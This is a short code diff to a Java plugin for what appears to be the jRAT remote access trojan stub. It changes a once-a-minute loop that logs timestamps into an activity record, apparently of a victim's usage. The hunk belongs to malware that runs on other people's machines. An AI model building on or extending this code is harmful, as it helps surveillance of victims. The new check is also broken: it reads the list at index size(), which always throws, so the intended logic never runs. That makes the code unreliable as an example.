@@ -186,7 +186,12 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 				while (true) {
 					try {
 						Thread.sleep(1000L * 60L);
-						Activities.add(new Time(System.currentTimeMillis()));
+						
+						Activity lastItem = Activities.activities.get(Activities.activities.size());
+						
+						if (lastItem != null && !(lastItem instanceof Time) || lastItem == null) {
+							Activities.add(new Time(System.currentTimeMillis()));
+						}
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
